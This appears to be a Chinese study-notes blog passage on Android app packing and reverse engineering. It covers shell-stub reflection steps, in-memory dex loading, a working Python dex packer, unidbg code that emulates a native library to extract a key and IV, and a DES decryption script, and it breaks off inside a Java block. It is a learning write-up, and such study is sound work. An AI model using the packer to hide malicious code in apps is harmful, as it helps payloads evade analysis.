class="hljs-number">2</span>.获取壳程序AndroidManifest.xml中源程序的包名和Application。<br><br><span class="hljs-number">3</span>.执行android<span class="hljs-selector-class">.app</span>.ActivityThread类的currentActivityThread方法，获取当前的android<span class="hljs-selector-class">.app</span>.ActivityThread实例currentActivityThread。<br><br><span class="hljs-number">4</span>.获取currentActivityThread中的android<span class="hljs-selector-class">.app</span>.ActivityThread类实例成员mBoundApplication。<br><br><span class="hljs-number">5</span>.在上述mBoundApplication中获取android<span class="hljs-selector-class">.app</span>.ActivityThread<span class="hljs-variable">$AppBindData</span>类实例info。<br><br><span class="hljs-number">6</span>.将上述info实例中的android<span class="hljs-selector-class">.app</span>.LoadedApk类实例成员mApplication设置为null。<br><br><span class="hljs-number">7</span>.在currentActivityThread中获取android<span class="hljs-selector-class">.app</span>.ActivityThread类实例mInitialApplication。<br><br><span class="hljs-number">8</span>.在currentActivityThread中获取android<span class="hljs-selector-class">.app</span>.ActivityThread类对象mAllApplications，该对象是个ArrayList&lt;Application&gt;结构，并在次结构中删除mInitialApplication对象。<br><br><span class="hljs-number">9</span>.获取info对象中android<span class="hljs-selector-class">.app</span>.LoadedApk类成员对象mApplicationInfo。<br><br><span class="hljs-number">10</span>.在mBoundApplication对象中获取android<span class="hljs-selector-class">.app</span>.ActivityThread<span class="hljs-variable">$AppBindData</span>类成员对象appInfo。<br><br><span class="hljs-number">11</span>.appInfo和mApplicationInfo实例的className成员变量设置为源程序的包名。<br><br><span class="hljs-number">12</span>.执行android<span class="hljs-selector-class">.app</span>.LoadedApk类对象info中的成员方法makeApplicationinfo，创建一个Application类实例。<br><br><span class="hljs-number">13</span>.设置android<span class="hljs-selector-class">.app</span>.ActivityThread类实例currentActivityThread中的成员对象mInitialApplication的值为上一步创建的Application类实例。<br><br><span class="hljs-number">14</span>.获取android<span class="hljs-selector-class">.app</span>.ActivityThread类对象currentActivityThread中的成员对象mProviderMap，该对象是一个ArrayMap结构，其元素是android<span class="hljs-selector-class">.app</span>.ActivityThread<span class="hljs-variable">$ProviderClientRecord</span>类。<br><br><span class="hljs-number">15</span>.遍历该成员对象，并获取其成员对象mLocalProvider，该成员对象是android<span class="hljs-selector-class">.content</span>.ContentProvider类，设置该android<span class="hljs-selector-class">.content</span>.ContentProvider类的成员对象mContext值为上述创建的Application。<br><br><span class="hljs-number">16</span>.调用上述步骤所创建的Application类实例中的onCreate方法。<br><br><br>第三部分 加壳<br></code></pre></td></tr></table></figure>



<h5 id="第二代壳：内存中的源APK字节码进行加载"><a href="#第二代壳：内存中的源APK字节码进行加载" class="headerlink" title="第二代壳：内存中的源APK字节码进行加载"></a>第二代壳：内存中的源APK字节码进行加载</h5><ul>
<li>Android 4及以下，最终调用带三个参数的native方法openDexFile()，但并不接受文件字节码作为参数。然而其另一个重载方法接受字节码数组作为参数传入。</li>
<li>Android 5~7，最终调用<code>openDexFile()</code>方法，里面会调用native方法<code>openDexFileNative()</code>，然而并不接受文件字节码作为参数。因此需要借助<code>libart.so</code>库中的<code>OpenMemory()</code>函数来实现内存加载文件字节码（需要编写native层代码实现）。</li>
<li>Android 8及以上，跟Android 5~7一样的流程，但是额外多了一个用于加载内存dex的类加载器InMemoryDexClassLoader</li>
</ul>
<p>都会返回一个cookie（DexFile的首地址）值</p>
<p><strong>dex中类的加载</strong></p>
<p>系统给定的类加载器DexClassLoader和PathClassLoader类加载器，在创建时值接受（dex相关）文件路径。中间的方法（3~6）都只是作为一个跳板而已</p>
<p><img src="image-20240329213832780.png" srcset="/img/loading.gif" lazyload alt="image-20240329213832780"></p>
<p>&#x2F;libcore&#x2F;dalvik&#x2F;src&#x2F;main&#x2F;java&#x2F;dalvik&#x2F;system&#x2F;DexFile.java中的getClassNameList()方法可获得从cookie中获得dex所有类名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String[] getClassNameList(Object cookie);<br></code></pre></td></tr></table></figure>



<p>Android7多了一个DexFile参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">defineClassNative(String name, ClassLoader loader, Object cookie, DexFile dexFile)<br></code></pre></td></tr></table></figure>



<p>解决方法：</p>
<ol>
<li>传入null，查看对应源码，可以知道就是多了一步<code>class_linker-&gt;InsertDexFileInToClassLoader()</code>，顾名思义，应该是将DexFile文件加载到类加载器中，方便之后加载类。而加载类的过程我们自己实现了，应该不会有问题的。</li>
<li>刚刚上一小节说过，cookie这个其实就是个DexFile的首地址，那么我们就可以通过这个获取DexFile对象。</li>
</ol>
<p>为什么说cookie是地址呢，证据如下：</p>
<p><code>art/runtime/native/dalvik_system_DexFile.cc</code>目录下的<code>DexFile_defineClassNative</code>函数：</p>
<ul>
<li><p>Android 5.1 ：第一行就是调用<code>toDexFiles(cookie, env)</code>函数获取DexFile对象，而且该方法定义时，第一个参数名为dex_file_address。</p>
</li>
<li><p>Android 6 ~ ：第一行代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">`std::unique_ptr&lt;std::vector&lt;<span class="hljs-type">const</span> DexFile*&gt;&gt; dex_files = <span class="hljs-built_in">ConvertJavaArrayToNative</span>(env, cookie)`<br><br>CPP<br></code></pre></td></tr></table></figure>

<p>是吧，又是通过cookie得到DexFile对象！</p>
</li>
</ul>
<p>所以说，非常肯定cookie就是DexFile的首地址</p>
<p>加壳程序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span> adler32<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixCheckSum</span>(<span class="hljs-params">dexBytesArray</span>):<br>    <span class="hljs-comment"># dexfile[8:12]</span><br>    <span class="hljs-comment"># 小端存储</span><br>    value = adler32(<span class="hljs-built_in">bytes</span>(dexBytesArray[<span class="hljs-number">12</span>:]))<br>    valueArray = <span class="hljs-built_in">bytearray</span>(value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(valueArray)):<br>        dexBytesArray[<span class="hljs-number">8</span> + i] = valueArray[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixSignature</span>(<span class="hljs-params">dexBytesArray</span>):<br>    <span class="hljs-comment"># dexfile[12:32]</span><br>    sha_1 = sha1()<br>    sha_1.update(<span class="hljs-built_in">bytes</span>(dexBytesArray[<span class="hljs-number">32</span>:]))<br>    value = sha_1.hexdigest()<br>    valueArray = <span class="hljs-built_in">bytearray</span>(unhexlify(value))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(valueArray)):<br>        dexBytesArray[<span class="hljs-number">12</span> + i] = valueArray[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixFileSize</span>(<span class="hljs-params">dexBytesArray, fileSize</span>):<br>    <span class="hljs-comment"># dexfile[32:36]</span><br>    <span class="hljs-comment"># 小端存储</span><br>    fileSizeArray = <span class="hljs-built_in">bytearray</span>(fileSize.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fileSizeArray)):<br>        dexBytesArray[<span class="hljs-number">32</span> + i] = fileSizeArray[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypto</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-comment"># for i in range(len(file)):</span><br>    <span class="hljs-comment">#     file[i] ^= 0xff</span><br>    <span class="hljs-keyword">return</span> file<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readDexsSourceApk</span>(<span class="hljs-params">sourceApkPath</span>):<br>    dexList = []<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(sourceApkPath, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> sourceApk:<br>        <span class="hljs-comment"># 获取apk中所有的文件路径名称</span><br>        nameList = sourceApk.namelist()<br>        <span class="hljs-keyword">for</span> fileName <span class="hljs-keyword">in</span> nameList:<br>            <span class="hljs-comment"># 提取dex文件</span><br>            <span class="hljs-keyword">if</span> fileName.endswith(<span class="hljs-string">&quot;.dex&quot;</span>):<br>                <span class="hljs-comment"># 解压缩到当前目录下 sourceApk.extract(fileName)</span><br>                <span class="hljs-comment"># 建议直接读取</span><br>                <span class="hljs-keyword">with</span> sourceApk.<span class="hljs-built_in">open</span>(fileName) <span class="hljs-keyword">as</span> dexfile:<br>                    data = <span class="hljs-built_in">bytearray</span>(dexfile.read())<br>                    dexList.append(data)<br>    <span class="hljs-keyword">return</span> dexList<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readDexFromShellApk</span>(<span class="hljs-params">shellApkPath</span>):<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(shellApkPath, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> sourceApk:<br>        <span class="hljs-comment"># 获取apk中所有的文件路径名称</span><br>        nameList = sourceApk.namelist()<br>        <span class="hljs-keyword">for</span> fileName <span class="hljs-keyword">in</span> nameList:<br>            <span class="hljs-comment"># 提取dex文件</span><br>            <span class="hljs-keyword">if</span> fileName.endswith(<span class="hljs-string">&quot;.dex&quot;</span>):<br>                <span class="hljs-comment"># 建议直接读取</span><br>                <span class="hljs-keyword">with</span> sourceApk.<span class="hljs-built_in">open</span>(fileName) <span class="hljs-keyword">as</span> dexfile:<br>                    data = <span class="hljs-built_in">bytearray</span>(dexfile.read())<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">combineSourceDexs</span>(<span class="hljs-params">sourceDexList</span>):<br>    combinedDex = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> dexfile <span class="hljs-keyword">in</span> sourceDexList:<br>        dexfileLen = <span class="hljs-built_in">len</span>(dexfile)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dexfileLen))<br>        <span class="hljs-comment"># 首先存放当前dex的大小，四字节，小端存储</span><br>        combinedDex += <span class="hljs-built_in">bytearray</span>(dexfileLen.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-comment"># 然后存放当前dex</span><br>        combinedDex += dexfile<br>    <span class="hljs-keyword">return</span> combinedDex<br><span class="hljs-comment"># 待实现</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forkShellLibIntoSourceApk</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    sourceApkPath = <span class="hljs-string">&quot;sourceApk.apk&quot;</span><br>    shellApkPath = <span class="hljs-string">&quot;shellApk.apk&quot;</span><br>    newApkPath = <span class="hljs-string">&quot;newApk.apk&quot;</span><br>    <span class="hljs-comment"># 读取源APK中的dex文件,可以接受多dex</span><br>    sourceDexList = readDexsSourceApk(sourceApkPath)<br>    <span class="hljs-comment"># 读取壳程序dex,只能有一个dex</span><br>    shellDex = readDexFromShellApk(shellApkPath)<br>    <span class="hljs-comment"># 合并源程序dex</span><br>    combineSourceDex = combineSourceDexs(sourceDexList)<br>    <span class="hljs-comment"># 加密源程序dex</span><br>    encSourceDex = encrypto(combineSourceDex)<br>    encSourceDexLen = <span class="hljs-built_in">len</span>(encSourceDex)<br>    <span class="hljs-comment"># 新的dex文件内容 = 壳dex + 加密的源dex + 四字节标识加密后源dex大小长度</span><br>    newDex = shellDex + encSourceDex + <span class="hljs-built_in">bytearray</span>(encSourceDexLen.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>    newDexLen = <span class="hljs-built_in">len</span>(newDex)<br>    <span class="hljs-comment"># 首先修改filesize</span><br>    fixFileSize(newDex, newDexLen)<br>    <span class="hljs-comment"># 其次修改signature</span><br>    fixSignature(newDex)<br>    <span class="hljs-comment"># 最后修改checksum</span><br>    fixCheckSum(newDex)<br>    <br>    <span class="hljs-comment"># 本想用代码实现替换apk中的dex（先删除再写入），但zipfile库没有现成的方法，还是算了</span><br>    <span class="hljs-comment"># 导出成新的dex文件</span><br>    <br>    <span class="hljs-comment"># 其实还有一个问题，就是需要把脱壳APK中的lib库复制过来！</span><br>    <span class="hljs-comment"># 待实现（解压缩，替换，再压缩？？？）</span><br>    <span class="hljs-comment"># forkShellLibIntoSourceApk()</span><br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;classes.dex&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">bytes</span>(newDex))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start()<br></code></pre></td></tr></table></figure>



<h4 id="调试手段"><a href="#调试手段" class="headerlink" title="调试手段"></a>调试手段</h4><h5 id="逆向工具之unidbg（在pc端模拟执行so文件中的函数）"><a href="#逆向工具之unidbg（在pc端模拟执行so文件中的函数）" class="headerlink" title="逆向工具之unidbg（在pc端模拟执行so文件中的函数）"></a>逆向工具之unidbg（在pc端模拟执行so文件中的函数）</h5><p>下载项目：<a target="_blank" rel="noopener" href="https://github.com/zhkl0228/unidbg">https://github.com/zhkl0228/unidbg</a>   idea导入，设置为maven</p>
<p><img src="image-20240521211538793.png" srcset="/img/loading.gif" lazyload alt="image-20240521211538793"></p>
<p>在类中执行</p>
<p><img src="image-20240521211655478.png" srcset="/img/loading.gif" lazyload alt="image-20240521211655478"></p>
<p><img src="image-20240521212753303.png" srcset="/img/loading.gif" lazyload alt="image-20240521212753303"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> re13;<br><br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.AbstractJni;<br><span class="hljs-keyword">import</span> com.github.unidbg.AndroidEmulator;<br><span class="hljs-keyword">import</span> com.github.unidbg.Module;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.*;<br><span class="hljs-keyword">import</span> com.github.unidbg.memory.Memory;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.DalvikModule;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.DvmClass;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.VM;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">re13</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJni</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AndroidEmulator emulator;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VM vm;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Module <span class="hljs-keyword">module</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Memory memory;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DalvikModule dm;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">re13</span><span class="hljs-params">(String apkFilePath, String soFilePath, String apkProcessname)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        emulator = AndroidEmulatorBuilder.for64Bit().setProcessName(apkProcessname).build();<br>        memory = emulator.getMemory();<br>        memory.setLibraryResolver(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AndroidResolver</span>(<span class="hljs-number">23</span>));<br>        vm = emulator.createDalvikVM(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(apkFilePath));<br>        vm.setVerbose(<span class="hljs-literal">false</span>);<br>        dm = vm.loadLibrary(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(soFilePath), <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">module</span> = dm.getModule();<br>        vm.setJni(<span class="hljs-built_in">this</span>);<br>        dm.callJNI_OnLoad(emulator);<br>        vm.setVerbose(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">re13</span><span class="hljs-params">(AndroidEmulator emulator, VM vm, Module <span class="hljs-keyword">module</span>, Memory memory, DalvikModule dm)</span> &#123;<br>        <span class="hljs-built_in">this</span>.emulator = emulator;<br>        <span class="hljs-built_in">this</span>.vm = vm;<br>        <span class="hljs-built_in">this</span>.<span class="hljs-keyword">module</span> = <span class="hljs-keyword">module</span>;<br>        <span class="hljs-built_in">this</span>.memory = memory;<br>        <span class="hljs-built_in">this</span>.dm = dm;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">GETKEY</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">DvmObject</span> <span class="hljs-variable">object1</span> <span class="hljs-operator">=</span> object.callJniMethodObject(emulator, <span class="hljs-string">&quot;getkey()Ljava/lang/String;&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultValue</span> <span class="hljs-operator">=</span> object1.getValue().toString();<br>        <span class="hljs-keyword">return</span> resultValue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">GETIV</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">DvmObject</span> <span class="hljs-variable">object1</span> <span class="hljs-operator">=</span> object.callJniMethodObject(emulator, <span class="hljs-string">&quot;getiv()Ljava/lang/String;&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultValue</span> <span class="hljs-operator">=</span> object1.getValue().toString();<br>        <span class="hljs-keyword">return</span> resultValue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">soFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\unidbg-master\\so\\libSecret_entrance.so&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">apkFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\unidbg-master\\so\\app-debug.apk&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">apkProcessname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.tencent.callre2&quot;</span>;<br>        <span class="hljs-comment">//创建一个实例</span><br>        <span class="hljs-type">re13</span> <span class="hljs-variable">re2app</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">re13</span>(apkFilePath, soFilePath, apkProcessname);<br>        <span class="hljs-comment">//解出key和iv</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">KEY</span> <span class="hljs-operator">=</span> re2app.GETKEY();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IV</span> <span class="hljs-operator">=</span> re2app.GETIV();<br>        System.out.println(<span class="hljs-string">&quot;getKeyresult: &quot;</span> + KEY);<br>        System.out.println(<span class="hljs-string">&quot;getivresult: &quot;</span> + IV);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>DES</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_des_decrypt</span>(<span class="hljs-params">encrypted_data, secret_key, initialization_vector</span>):<br>    <span class="hljs-comment"># 解码base64编码的密文</span><br>    encrypted_bytes = base64.b64decode(encrypted_data)<br>    key_bytes = secret_key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    iv_bytes = initialization_vector.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 创建DES解密器</span><br>    cipher = DES.new(key_bytes, DES.MODE_CBC, iv_bytes)<br>    <br>    <span class="hljs-comment"># 解密数据并去除填充</span><br>    decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), DES.block_size)<br>    decrypted_text = decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    <span class="hljs-keyword">return</span> decrypted_text<br><br><span class="hljs-comment"># 示例用法</span><br>encrypted_data = <span class="hljs-string">&#x27;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&#x27;</span><br>secret_key = <span class="hljs-string">&#x27;A8UdWaeq&#x27;</span>  <span class="hljs-comment"># 这里是你的8字节的key</span><br>initialization_vector = <span class="hljs-string">&#x27;Wf3DLups&#x27;</span>  <span class="hljs-comment"># 这里是你的8字节的初始向量</span><br><br>decrypted_text = custom_des_decrypt(encrypted_data, secret_key, initialization_vector)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted text:&quot;</span>, decrypted_text)<br><br></code></pre></td></tr></table></figure>





<p>尝试</p>
<p><img src="image-20240724202627427.png" srcset="/img/loading.gif" lazyload alt="image-20240724202627427"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 